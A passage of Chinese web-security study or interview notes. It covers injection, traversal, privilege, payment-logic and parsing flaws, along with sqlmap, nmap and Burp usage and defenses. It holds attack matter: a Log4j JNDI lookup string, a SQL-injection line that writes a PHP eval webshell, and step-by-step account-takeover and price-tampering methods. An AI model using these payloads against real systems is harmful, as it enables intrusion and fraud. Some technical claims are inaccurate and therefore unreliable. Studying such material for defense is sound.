注意不要使用escapeshellcmd() 过滤escapeshellarg()过滤之后的字符串，这样会造成\’转义成\\’从而吃掉\的问题
</p></li>

<li><p>
使用参数白名单
</p>

<p>
在代码或配置文件中设置可输入的参数白名单，如果不在白名单列表中则提示错误。
</p></li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:4cb1e9b0-cf1c-4e1c-b6ca-4cd79093c592" class="outline-4">
<h4 id="h:4cb1e9b0-cf1c-4e1c-b6ca-4cd79093c592">目录遍历</h4>
<div class="outline-text-4" id="text-h:4cb1e9b0-cf1c-4e1c-b6ca-4cd79093c592">
<p>
程序在实现上没有充分过滤用户输入的…/之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件
</p>

<ul class="org-ul">
<li>防御

<ul class="org-ul">
<li>对用户的输入进行验证，特别是路径替代字符“…/”</li>
<li>尽可能采用白名单的形式，验证所有输入</li>
<li>合理配置web服务器的目录权限</li>
<li>程序出错时，不要显示内部相关细节</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:aa5cac65-5b9b-4df4-80fd-d349041cd7d3" class="outline-4">
<h4 id="h:aa5cac65-5b9b-4df4-80fd-d349041cd7d3">逻辑漏洞</h4>
<div class="outline-text-4" id="text-h:aa5cac65-5b9b-4df4-80fd-d349041cd7d3">
<ul class="org-ul">
<li>越权漏洞 （一般在增删改查，登陆，更新的地方寻找越权漏洞）

<ul class="org-ul">
<li>水平越权: 攻击者尝试访问与他相同权限的用户资源</li>
<li>垂直越权: 攻击者访问比他高级别权限的用户</li>
</ul></li>

<li><p>
修改什么地方来验证
</p>

<p>
类似ID,user,uid这类身份标识类传参
</p>

<p>
Get请求修改url中参数。比如username=XXX
</p>

<p>
垂直越权：先抓取高权限的数据包，比如添加用户，然后再用低权限的cookie发送请求包
</p></li>

<li><p>
原理
</p>

<p>
因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。
</p></li>

<li><p>
防御
</p>

<p>
将身份校验写入会话，跟请求的资源做验证
</p>

<ol class="org-ol">
<li>清洗URL地址，并提取Api接口名称；</li>
<li>从session中提取当前登录用户的userid；</li>
<li>提取当前用户的角色id；</li>
<li>判断当前用户对应的角色是否有权限访问当前Api接口（检查垂直越权）；</li>
<li>最后判断当前登录用户是否对目标对象有操作权限（检查水平越权）。</li>
<li>类似订单号这种参数，生成时要无规律可循，可以通过hash算法进行加密；或者请求的数据包额外附带token，从而防止重放和遍历订单号这类攻击（篡改订单号）。</li>
</ol></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:662336cb-6535-4fc0-9cdc-77291aef1944" class="outline-3">
<h3 id="h:662336cb-6535-4fc0-9cdc-77291aef1944">功能漏洞-带有业务功能场景漏洞</h3>
<div class="outline-text-3" id="text-h:662336cb-6535-4fc0-9cdc-77291aef1944">
</div>
<div id="outline-container-h:4255e400-2b13-4d34-b799-d5cf7e97180e" class="outline-4">
<h4 id="h:4255e400-2b13-4d34-b799-d5cf7e97180e">发送验证码存在哪些漏洞</h4>
<div class="outline-text-4" id="text-h:4255e400-2b13-4d34-b799-d5cf7e97180e">
<ul class="org-ul">
<li>无效验证</li>
<li>任意用户注册：先用自己的手机号接收验证码进行验证，然后跳到一个设定密码的页面抓包篡改任意手机号</li>
<li>验证码绕过</li>
<li>验证码不刷新</li>
<li>状态码绕过：将响应码修改成200直接绕过/error修改成OK等</li>
<li>前端校验：隐藏在网站源码或者ck中</li>
<li>可被识别：自动化工具登陆爆破PKAV的HTTP Fuzzer</li>
<li>空值绕过：直接删除验证码参数或者ck中的值，进行暴力破解</li>
<li>短信/邮件炸弹</li>
<li>验证码爆破：4-6位，若服务端未对验证时间、次数进行限制，则存在被爆破的可能</li>
<li>验证码与手机号未绑定：A的验证码B可以用
<ul class="org-ul">
<li><p>
任意用户注册漏洞：可以使用任意手机号进行注册，操作步骤如下
</p>

<p>
1.在注册界面，输入自己的手机号；2.发送验证码，拿到验证码，然后退出登录界面；3.重新进入注册界面，输入任意人的手机号，输入刚才拿到的自己的验证码，注册成功
</p>

<p>
任意用户密码重置漏洞
</p>

<p>
可以任意修改任何账号的密码，操作步骤如下：1.在忘记密码界面，输入自己的手机号；2.发送验证码，拿到验证码，然后退出忘记密码界面；3.输入其他人的手机号，输入自己的验证码，验证成功，修改别人的密码成功。
</p></li>
</ul></li>
</ul>


<ul class="org-ul">
<li>防御

<ul class="org-ul">
<li>短信验证码不少于6位</li>
<li>在服务端验校验验证码与手机号绑定</li>
<li>有效期不超过1分钟</li>
<li>验证码错误次数超过上限应采取账户锁定策略</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:a37fab82-e9df-47ca-8833-bd4fa48c8a2a" class="outline-4">
<h4 id="h:a37fab82-e9df-47ca-8833-bd4fa48c8a2a">支付逻辑漏洞，怎么改价格</h4>
<div class="outline-text-4" id="text-h:a37fab82-e9df-47ca-8833-bd4fa48c8a2a">
<ol class="org-ol">
<li><p>
修改支付价格
</p>

<p>
在支付流程中，提交购买信息、确认支付、确认购买的流程中，如果相互之间没有做好验证机制，就有可能出现修改支付价格的漏洞。
</p>

<p>
在这三个步骤中，可以尝试抓包，修改支付价格。
</p></li>

<li><p>
修改支付状态
</p>

<p>
这个问题是没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功。
</p></li>

<li><p>
修改购买数量
</p>

<p>
抓包，尝试修改购买数量，如果修改购买数量后，价格不变，亦或者修改购买数量为负数，如果价格为负数，同样会导致支付问题的产生。
</p></li>

<li><p>
最小额支付
</p>

<p>
在修改支付价格时，如果没有支付成功或兑换成功，并不能说明该网站不存在支付漏洞。注意网站的最小支付额，网站可能会对此进行校验，小于这个最小支付额，无法购买，也有可能兑换的物品为空。
</p></li>

<li><p>
值为最大值支付问题
</p>

<p>
以前也是看到过相关的例子，一些网站比如你购买商品，这里有2个思路修改值，1是直接修改支付金额值为最大值，比如999999999，或者修改附属值，如优惠卷，积分等为999999999，如果这里逻辑设计有问题，那么其支付金额会变为0。
</p></li>
</ol>

<p>
修复防范
</p>

<p>
请求数据中对涉及金额、数量等敏感信息进行加密，并在服务器端对其进行校验.
</p>

<p>
支付交易请求数据中加入token，防止重放攻击
</p>

<p>
支付宝接口返回的价格 和 订单金额 进行比对，
</p>
</div>
</div>
<div id="outline-container-h:a887bc46-03fa-4f47-92cf-f0c4ede11598" class="outline-4">
<h4 id="h:a887bc46-03fa-4f47-92cf-f0c4ede11598">登录框都可以测哪些漏洞</h4>
<div class="outline-text-4" id="text-h:a887bc46-03fa-4f47-92cf-f0c4ede11598">
<ul class="org-ul">
<li><p>
登录页面
</p>

<p>
明文传输，用户名可枚举，弱口令，暴力破解，sql注入（万能密码绕过）任意密码重置，XSS，验证码，URL重定向
</p>

<p>
登录认证绕过，图形验证码不失效，短信验证码绕过，短信炸弹
</p></li>

<li><p>
注册页面
</p>

<p>
批量注册，注册覆盖，短信邮件炸弹，验证码可爆破，图片验证码是否可绕过
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:32728842-1e8d-48b4-958a-f8071eddcd56" class="outline-4">
<h4 id="h:32728842-1e8d-48b4-958a-f8071eddcd56">反序列化</h4>
<div class="outline-text-4" id="text-h:32728842-1e8d-48b4-958a-f8071eddcd56">
<ul class="org-ul">
<li><p>
PHP反序列化
</p>

<p>
序列化(serialize)：将对象转换为字符串 
</p>

<p>
反序列化(unserialze)：将字符串转换为对象
</p>

<p>
魔术方法：unserialize()时__wakeup() 或__destruct()的直接调用，中间无需其他过程）
</p></li>

<li><p>
PHP反序列化原理
</p>

<p>
由于程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果，一般程序在创建的时候，都会重写析构函数和构造函数，反序列化就是利用这些重写的函数
</p></li>

<li><p>
JAVA反序列化
</p>

<p>
序列化（writeObject）：把对象转换为字节序列的过程；
</p>

<p>
反序列化（readObject）：把字节序列恢复为 Java 对象的过程；
</p></li>

<li><p>
防御
</p>

<p>
结合调用链，unserialize上级调用链的类和函数进行白名单限制，在反序列化之前，过滤用户输入&lt; 、？等
</p></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:a095eff1-4169-4b68-83c9-a46c7c4dad8f" class="outline-3">
<h3 id="h:a095eff1-4169-4b68-83c9-a46c7c4dad8f">组件漏洞</h3>
<div class="outline-text-3" id="text-h:a095eff1-4169-4b68-83c9-a46c7c4dad8f">
<ul class="org-ul">
<li>fastjson</li>
<li>中间件</li>
</ul>
</div>
<div id="outline-container-h:b6a96d93-82f7-463b-bfc0-1f250bcbb084" class="outline-4">
<h4 id="h:b6a96d93-82f7-463b-bfc0-1f250bcbb084">Apache Log4j2远程代码执行与拒绝服务攻击漏洞（2.0&lt;=2.15.0-rc1）</h4>
<div class="outline-text-4" id="text-h:b6a96d93-82f7-463b-bfc0-1f250bcbb084">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
主要是由于Nslookup循环解析JNDI，导致可以直接构造恶意请求，触发远程代码执行漏洞
</p>

<p>
“${jndi:ldap:// aqo3x3.dnslog.cn}”
</p>

<p>
由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞Apache Log4j2中存在JNDI注入漏洞，当程序将用户的数据进行日志记录时，即可触发此漏洞，
</p>

<p>
Apache Log4j是一个基于JAVA的日志记录组件，Apache Log4j2是Log4j的升级版本，通过重写log4j引入了丰富的功能特性，用于记录程序输入输出的日志信息
</p></li>

<li>修复方式

<ol class="org-ol">
<li>更新至官方修复版本</li>
<li><p>
在jvm启动参数中添加：-Dlog4j2.formatMsgNoLooKups=true 禁用nolookups
</p>

<p>
系统环境变量中配置：FORMAT_MESSAGES_PATTERN+DISABLE_LOOKUPS=r=true
</p>

<p>
项目中创建log4j2.component.properties文件，文件中增加配置log4j2. formatMsgNoLooKups=true
</p></li>
</ol></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:4f2e7a79-3843-46c0-8aad-d119ab5e432b" class="outline-3">
<h3 id="h:4f2e7a79-3843-46c0-8aad-d119ab5e432b">信息收集</h3>
<div class="outline-text-3" id="text-h:4f2e7a79-3843-46c0-8aad-d119ab5e432b">
</div>
<div id="outline-container-h:20b6fd1f-8190-45f3-a930-31e24b208c0b" class="outline-4">
<h4 id="h:20b6fd1f-8190-45f3-a930-31e24b208c0b">Google Hacking 语法</h4>
<div class="outline-text-4" id="text-h:20b6fd1f-8190-45f3-a930-31e24b208c0b">
<p>
site       指定域名
</p>

<p>
inurl      URL存在关键字的网页
</p>

<p>
intitle    标题中存在关键字的网页
</p>

<p>
intext    正文中存在关键字的网页
</p>

<p>
info       一些基本信息
</p>

<p>
filetype  搜索指定文件类型
</p>
</div>
</div>
</div>
<div id="outline-container-h:bf878827-863b-4a5e-8eca-ddc3abd1d00f" class="outline-3">
<h3 id="h:bf878827-863b-4a5e-8eca-ddc3abd1d00f">安全工具使用</h3>
<div class="outline-text-3" id="text-h:bf878827-863b-4a5e-8eca-ddc3abd1d00f">
</div>
<div id="outline-container-h:409afbf1-7b5b-4668-a97e-13c44b246e56" class="outline-4">
<h4 id="h:409afbf1-7b5b-4668-a97e-13c44b246e56">一些概念</h4>
<div class="outline-text-4" id="text-h:409afbf1-7b5b-4668-a97e-13c44b246e56">
</div>
<div id="outline-container-h:957bb798-8135-4f5b-86d3-973efcee63ff" class="outline-5">
<h5 id="h:957bb798-8135-4f5b-86d3-973efcee63ff">同源策略</h5>
<div class="outline-text-5" id="text-h:957bb798-8135-4f5b-86d3-973efcee63ff">
<p>
浏览器安全的基石是"同源政策"，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie
</p>
</div>
</div>
<div id="outline-container-h:4a573f2a-a927-4e7d-b986-6f29f3d4c0d8" class="outline-5">
<h5 id="h:4a573f2a-a927-4e7d-b986-6f29f3d4c0d8">Get和Post</h5>
<div class="outline-text-5" id="text-h:4a573f2a-a927-4e7d-b986-6f29f3d4c0d8">
<p>
Get是不安全的，因为在传输过程，数据被放在请求的URL中；传送的数据量较小
</p>

<p>
Post的所有操作对用户来说都是不可见的，相对安全。传送的数据量较大，一般被默认为不受限制
</p>
</div>
</div>
<div id="outline-container-h:0a424609-388f-4732-9726-5c58c3186f5b" class="outline-5">
<h5 id="h:0a424609-388f-4732-9726-5c58c3186f5b">session与cookie:</h5>
<div class="outline-text-5" id="text-h:0a424609-388f-4732-9726-5c58c3186f5b">
<p>
session是存储服务器端，cookie是存储在客户端，所以session的安全性比cookie高。
</p>

<p>
cookie：存储本地，存活时间较长。不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗
</p>

<p>
session：存储服务器上，存活时间较短，重要信息应该存放为session。大型网站
</p>
</div>
</div>
<div id="outline-container-h:d591e402-5610-4c78-8fa3-4b90988dce4d" class="outline-5">
<h5 id="h:d591e402-5610-4c78-8fa3-4b90988dce4d">linux 常见命令添加 删除 修改 复制一个文件</h5>
<div class="outline-text-5" id="text-h:d591e402-5610-4c78-8fa3-4b90988dce4d">
<p>
ls：查看文件夹包含的文件 文件权限. 目录信息
</p>

<p>
-l ：列出长数据串，包含文件的属性与权限数据等
</p>

<p>
-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用）
</p>

<p>
-d ：仅列出目录本身，而不是列出目录的文件数据
</p>

<p>
-h ：将文件容量以较易读的方式（GB，kB等）列出来
</p>

<p>
-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来
</p>


<p>
cd :用于切换当前目录
</p>

<p>
pwd :查看"当前工作目录"的完整路径
</p>

<p>
-P :显示实际物理路径，而非使用连接（link）路径
</p>

<p>
-L :当目录为连接路径时，显示连接路径
</p>

<p>
mkdir :创建目录
</p>

<p>
-m : 设定权限&lt;模式&gt; (类似 chmod)，
</p>

<ul class="org-ul">
<li>p : 可以是一个路径名称</li>
</ul>

<p>
-v : 每次创建新目录都显示信息
</p>

<p>
rm : 删除
</p>

<p>
-f : 忽略不存在的文件，从不给出提示
</p>

<p>
-r : 将 test 子目录及目录中所有档案删除
</p>

<p>
rmdir : 删除空的目录 从
</p>

<p>
-p： 当子目录删除后其父目录为空时，也一同被删除
</p>

<p>
mv ：移动文件或者将文件改名
</p>

<p>
cp： 将源文件复制至目标文件 
</p>

<p>
touch：更改文档或目录的日期时间，包括存取时间和更改时间
</p>

<p>
cat ：连接文件并打印到标准输出设备上
</p>
</div>
</div>
<div id="outline-container-h:7fe48bc5-8576-47e2-ae77-ff568408e07d" class="outline-5">
<h5 id="h:7fe48bc5-8576-47e2-ae77-ff568408e07d">windows linux 最高权限是什么</h5>
<div class="outline-text-5" id="text-h:7fe48bc5-8576-47e2-ae77-ff568408e07d">
<p>
Windows是system；Linux是 root 
</p>
</div>
</div>
<div id="outline-container-h:529d19d4-5c5e-47ff-9ea3-55462c6772ae" class="outline-5">
<h5 id="h:529d19d4-5c5e-47ff-9ea3-55462c6772ae">整数溢出</h5>
<div class="outline-text-5" id="text-h:529d19d4-5c5e-47ff-9ea3-55462c6772ae">
<p>
计算机语言中整数类型都有一个宽度，也就是说，一个整数类型有一个最大值和一个最小值。
</p>

<p>
当2个整数计算时，结果大于最大值或小于最小值就是溢出
</p>
</div>
</div>
</div>
<div id="outline-container-h:0fe80fa3-9254-4ec4-a3c3-0063e77885ef" class="outline-4">
<h4 id="h:0fe80fa3-9254-4ec4-a3c3-0063e77885ef">sqlmap使用方法命令</h4>
<div class="outline-text-4" id="text-h:0fe80fa3-9254-4ec4-a3c3-0063e77885ef">
<p>
sqlmap -u "<a href="http://www.xx.com?id=x%22%E3%80%90%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9">http://www.xx.com?id=x%22%E3%80%90%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9</a>】
</p>

<div class="org-src-container">
<pre class="src src-sh">--dbs&#12304;&#26816;&#27979;&#31449;&#28857;&#21253;&#21547;&#21738;&#20123;&#25968;&#25454;&#24211;&#12305;
--current-db&#12304;&#33719;&#21462;&#24403;&#21069;&#30340;&#25968;&#25454;&#24211;&#21517;&#12305;
--tables -D <span style="color: #8b2252;">"db_name"</span>&#12304;&#33719;&#21462;&#25351;&#23450;&#25968;&#25454;&#24211;&#20013;&#30340;&#34920;&#21517; -D&#21518;&#25509;&#25351;&#23450;&#30340;&#25968;&#25454;&#24211;&#21517;&#31216;&#12305;
--columns  -T <span style="color: #8b2252;">"table_name"</span> -D <span style="color: #8b2252;">"db_name"</span>&#12304;&#33719;&#21462;&#25968;&#25454;&#24211;&#34920;&#20013;&#30340;&#23383;&#27573;&#12305;
--dump -C <span style="color: #8b2252;">"columns_name"</span> -T <span style="color: #8b2252;">"table_name"</span> -D <span style="color: #8b2252;">"db_name"</span>&#12304;&#33719;&#21462;&#23383;&#27573;&#30340;&#25968;&#25454;&#20869;&#23481;&#12305;
&#8211;batch <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20840;&#37096;&#40664;&#35748;&#30830;&#23450;</span>
</pre>
</div>

<ul class="org-ul">
<li><p>
COOKIE注入：
</p>

<p>
sqlmap -u "<a href="http://www.xx.com?id=x">http://www.xx.com?id=x</a>" &#x2013;cookie "cookie" &#x2013;level 2【cookie注入后接cookie值】
</p></li>

<li>POST注入（3种方式）：

<ol class="org-ol">
<li><p>
sqlmap -r okay.txt  -p  username
</p>

<p>
-r表示加载文件 -p指定参数（拦截的post请求中表单提交的用户名或密码等name参数）
</p></li>

<li><p>
自动获取表单：&#x2013;forms自动获取表单
</p>

<p>
例如：sqlmap -u www.xx.com/login.asp &#x2013;forms
</p></li>

<li><p>
指定参数搜索：&#x2013;data
</p>

<p>
例如:sqlmap -u www.xx.com/login.asp &#x2013;data "username=1"
</p>

<p>
sqlmap -u <a href="http://vip.fj0730.cn/login.asp">http://vip.fj0730.cn/login.asp</a> &#x2013;forms &#x2013;dbs
</p></li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:62731763-0fd4-43ba-8b15-5bcb7be78d02" class="outline-4">
<h4 id="h:62731763-0fd4-43ba-8b15-5bcb7be78d02">如何绕过CDN获取目标网站的真实IP，谈谈你的思路、</h4>
<div class="outline-text-4" id="text-h:62731763-0fd4-43ba-8b15-5bcb7be78d02">
<p>
子域名查询（小技巧 pin检测的时候去掉www.）
</p>

<p>
超级PING
</p>

<p>
利用国外地址请求（<a href="https://get-site-ip.com/">https://get-site-ip.com/</a>   <a href="https://get-site-ip.com/">https://get-site-ip.com/</a> ）
</p>

<p>
邮件服务查询
</p>

<p>
黑暗引擎搜索
</p>

<p>
Phpinfo测试文件
</p>
</div>
</div>
<div id="outline-container-h:88b5c5b0-c2ab-4f46-97ab-f1e43cc4088b" class="outline-4">
<h4 id="h:88b5c5b0-c2ab-4f46-97ab-f1e43cc4088b">子域名查询工具</h4>
<div class="outline-text-4" id="text-h:88b5c5b0-c2ab-4f46-97ab-f1e43cc4088b">
<p>
subDomainsBrute  (工具)
</p>

<p>
站长工具（在线）
</p>

<p>
<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> (在线)
</p>
</div>
</div>
<div id="outline-container-h:6ebc67d4-dbd3-4264-a492-d24782fc184d" class="outline-4">
<h4 id="h:6ebc67d4-dbd3-4264-a492-d24782fc184d">burpSuite</h4>
<div class="outline-text-4" id="text-h:6ebc67d4-dbd3-4264-a492-d24782fc184d">
<ul class="org-ul">
<li><p>
爆破四种模式？简述过程
</p>

<p>
Sniper（狙击手模式）：一次只使用一个payload位置。适合对参数单独地进行测试
</p>

<p>
Battering ram（攻城锤模式）：只使用一个payload集合，适合把相同的输入放到多个位置的情况。简单说就是一个playload字典同时应用到多个position中。每次攻击都是替换所有payload标记位置
</p>

<p>
Pitchfork（交叉模式）：这一模式是使用多个payload组。可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中，适合不同位置中需要插入不同但相关的输入的情况
</p>

<p>
Cluster bomb（集束炸弹）：会对payload组进行笛卡尔积，每种payload组合都会被测试一遍，可以理解为暴力破解穷举法。适用于位置中需要不同且不相关或者未知的输入的攻击。
</p></li>

<li><p>
BurpSuite重放包怎么做？
</p>

<p>
发送到Repeater
</p></li>

<li><p>
对POST请求用户名密码爆破发送到哪里？
</p>

<p>
发送到Intruder
</p></li>

<li><p>
判断出网站的CMS对渗透有什么意义？
</p>

<p>
查找网上已曝光的程序漏洞。
</p>

<p>
如果开源，还能下载相对应的源码进行代码审计
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:dcbcb578-0bad-47d1-9744-8a9a81612e10" class="outline-4">
<h4 id="h:dcbcb578-0bad-47d1-9744-8a9a81612e10">解析漏洞</h4>
<div class="outline-text-4" id="text-h:dcbcb578-0bad-47d1-9744-8a9a81612e10">
</div>
<div id="outline-container-h:7ebeccf3-d3bf-402e-a527-7cebfded3999" class="outline-5">
<h5 id="h:7ebeccf3-d3bf-402e-a527-7cebfded3999">IIS 5.X/6.0解析漏洞</h5>
<div class="outline-text-5" id="text-h:7ebeccf3-d3bf-402e-a527-7cebfded3999">
<p>
目录解析 /xx.asp/xx.jpg
</p>

<ul class="org-ul">
<li><p>
形式：www.xxx.com/xx.asp/xx.jpg
</p>

<p>
原理: *.asp、.asa目录下的所有文件都被当作asp文件来解析并执行
</p></li>
</ul>

<p>
文件解析 Xxx.asp;.jpg（IIS6.0）
</p>

<ul class="org-ul">
<li><p>
形式：www.xxx.com/xx.asp;.jpg
</p>

<p>
原理：服务器默认不解析;号及其后面的内容，相当于截断，因此xx.asp;.jpg便被解析成asp文件了
</p></li>
</ul>

<p>
解析文件类型
</p>

<ul class="org-ul">
<li>IIS 6.0默认可执行文件除了ASP还包括.asa、.cer、.cdx</li>
</ul>
</div>
</div>
<div id="outline-container-h:709576c2-4335-4484-82c8-493237315e11" class="outline-5">
<h5 id="h:709576c2-4335-4484-82c8-493237315e11">Apache 解析漏洞</h5>
<div class="outline-text-5" id="text-h:709576c2-4335-4484-82c8-493237315e11">
<ul class="org-ul">
<li><p>
后缀解析漏洞
</p>

<p>
Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和“.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php
</p>

<p>
www.xxx.xxx.com/test.php.php123
</p></li>

<li><p>
.htaccess文件解析
</p>

<p>
先上传一个.htaccess文件，然后这个文件同目录下的所有文件都可以解析为PHP文件
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:f313e32f-f49f-4dc2-a732-57d0e640ed8b" class="outline-5">
<h5 id="h:f313e32f-f49f-4dc2-a732-57d0e640ed8b">Nginx &lt;8.03 空字节代码执行漏洞</h5>
<div class="outline-text-5" id="text-h:f313e32f-f49f-4dc2-a732-57d0e640ed8b">
<p>
例如：=<img src="http://127.0.0.1/1.jpg%00.php" alt="1.jpg%00.php">= 会把1.jpg文件（木马文件）当做PHP文件来执行。
</p>
</div>
</div>
</div>
<div id="outline-container-h:e2410949-b804-486d-b906-d3e9c8bced5b" class="outline-4">
<h4 id="h:e2410949-b804-486d-b906-d3e9c8bced5b">Nmap常用命令</h4>
<div class="outline-text-4" id="text-h:e2410949-b804-486d-b906-d3e9c8bced5b">
<p>
-p扫描指定端口和端口范围
</p>

<p>
-sP对目标主机进行ping扫描
</p>

<p>
-A使用高级功能进行扫描
</p>

<p>
-PE强制执行直接的ICMPping
</p>

<p>
-sV探测服务版本信息
</p>

<p>
-d增加调试信息地输出
</p>

<p>
-PU发送udp ping
</p>

<p>
-ps发送同步（SYN）报文
</p>

<p>
识别操作系统：nmap -O 192.168.152.130
</p>

<p>
半开扫描：nmap -sS 192.168.152.130
</p>

<p>
全开扫描：nmap -sT 192.168.152.130
</p>
</div>
</div>
<div id="outline-container-h:28afd22e-d445-4f0c-83c7-d41c8f1faad9" class="outline-4">
<h4 id="h:28afd22e-d445-4f0c-83c7-d41c8f1faad9">用过哪些扫描工具，区别是什么</h4>
<div class="outline-text-4" id="text-h:28afd22e-d445-4f0c-83c7-d41c8f1faad9">
<p>
Awvs：漏洞扫描速度较快，准确率较高，漏洞规则库较为全面。漏洞验证可查看请求响应代码，但无中文界面。报表功能完整。有多重漏洞的验证工具
</p>

<p>
Nessue：扫描速度快，能扫描系统层和web层类漏洞，但web漏洞发现能力不如appscan, 扫描IP限制为16个
</p>

<p>
Goby：安装过程非常简单，Windows解压缩直接双击EXE即可运行，可跨平台支持Windows、Linux、 Mac。功能上也挺全面的，提供最全面的资产识别，最快的扫描体验，内置可自定义的漏洞扫描框架。
</p>

<p>
Xrar：被动扫描
</p>

<p>
Nmap：主要用于系统层扫描，扫描速度快，准确率高，漏洞规则库全面，报表功能强大。
</p>
</div>
</div>
<div id="outline-container-h:d8407496-faf0-45df-b848-659902d3d238" class="outline-4">
<h4 id="h:d8407496-faf0-45df-b848-659902d3d238">获取webshell都有哪些方式</h4>
<div class="outline-text-4" id="text-h:d8407496-faf0-45df-b848-659902d3d238">
<p>
1：文件上传；
</p>

<p>
2：SQL注入：用into outfile 写入一句话【 ' union select 1,"&lt;?php eval($_POST['a']);" into outfile '/var/www/html/shell2.php】
</p>

<p>
3：文件包含：配合文件上传图片码进行包含；包含中间件日志；本地文件包含系统关键文件；
</p>

<p>
4：XSS：获取cookie登录—webshell
</p>

<p>
5：远程命令执行
</p>

<p>
6：解析漏洞
</p>
</div>
</div>
<div id="outline-container-h:fac11c3a-bb68-4521-9fa0-fb60f3354733" class="outline-4">
<h4 id="h:fac11c3a-bb68-4521-9fa0-fb60f3354733">加密算法：</h4>
<div class="outline-text-4" id="text-h:fac11c3a-bb68-4521-9fa0-fb60f3354733">
<ul class="org-ul">
<li><p>
对称加密：加密和解密都用相同的密钥
</p>

<p>
优点：速度快，缺点是密钥管理不方便，要求共享密钥。
</p>

<p>
DES：分组式加密算法，以64位为分组对数据加密，加解密使用同一个算法。
</p>

<p>
3DES：三重数据加密算法，对每个数据块应用三次DES加密算法。
</p>

<p>
AES：高级加密标准算法，是美国联邦政府采用的一种区块加密标准，用于替代原先的DES，目前已被广泛应用。
</p>

<p>
Blowfish：Blowfish算法是一个64位分组及可变密钥长度的对称密钥分组密码算法，可用来加密64比特长度的字符串。
</p></li>

<li><p>
非对称加密：加密和解密是不同的密钥，公钥和私钥是一对，用公钥对数据加密，对应的私钥解密
</p>

<p>
优点：密钥管理很方便，缺点是速度慢。
</p>

<p>
RSA：RSA算法基于一个十分简单的数论事实：将两个大素数相乘十分容易，但那时想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥，可用于加密，也能用于签名。
</p>

<p>
DSA：数字签名算法，仅能用于签名，不能用于加解密。
</p>

<p>
DSS：数字签名标准，技能用于签名，也可以用于加解密。
</p>

<p>
ELGamal：利用离散对数的原理对数据进行加解密或数据签名，其速度是最慢的。
</p></li>

<li><p>
散列算法（单向加密）：
</p>

<p>
MD5：是HASH算法一种、 是生成32位的数字字母混合码。 MD5主要特点是不可逆
</p>

<p>
SHA1：是哈希算法的一种
</p>

<p>
Sha224
</p></li>

<li>明文传输 防御：

<ol class="org-ol">
<li>使用https， HTTPS（443）在HTTP（80）的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。传输前用公钥加密，服务器端用私钥解</li>

<li>密码在传输前使用安全的算法加密后传输，可采用：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:88d5ab10-814c-411c-8c73-beecfc296bfb" class="outline-4">
<h4 id="h:88d5ab10-814c-411c-8c73-beecfc296bfb">http和https区别</h4>
<div class="outline-text-4" id="text-h:88d5ab10-814c-411c-8c73-beecfc296bfb">
<ol class="org-ol">
<li>HTTP 的 URL 以 <a href="http://">http://</a> 开头，而 HTTPS 的 URL 以 <a href="https://">https://</a> 开头</li>
<li>HTTP 是不安全的，而 HTTPS 是安全的</li>
<li>HTTP 标准端口是 80 ，而 HTTPS 的标准端口是 443</li>
<li>在 OSI 网络模型中，HTTP 工作于应用层，而 HTTPS 工作在传输层</li>
<li>HTTP 无需加密，而 HTTPS 对传输的数据进行加密</li>
<li>HTTP 无需证书，而 HTTPS 需要认证证书</li>
</ol>
</div>
</div>
<div id="outline-container-h:5ec5993a-c15b-46a6-b713-d8a9380cb703" class="outline-4">
<h4 id="h:5ec5993a-c15b-46a6-b713-d8a9380cb703">https请求过程：</h4>
<div class="outline-text-4" id="text-h:5ec5993a-c15b-46a6-b713-d8a9380cb703">
<ol class="org-ol">
<li>客户端向服务端发起https请求，连接到服务端的443端口</li>
<li>服务端将自己的数字证书其中包含公钥发送给客户端</li>
<li>客户端收到后，会先验证证书的合法性。如果有异常，就会弹出警告信息。如果没问题会生成一个随机数，然后使用公钥对随机数进行非对称加密</li>
<li>将加密后的随机值传到服务器</li>
<li>服务器使用私钥对其进行非对称解密后，得到客户端的随机值，然后把内容通过该随机值进行对称加密</li>
<li>服务端将对称加密后的信息发给客户端</li>
<li>客户端用之前的生成的随机值来进行对称解密，获取内容明文</li>
</ol>
</div>
</div>
<div id="outline-container-h:5967502d-93c6-4627-bf8b-4452be16c312" class="outline-4">
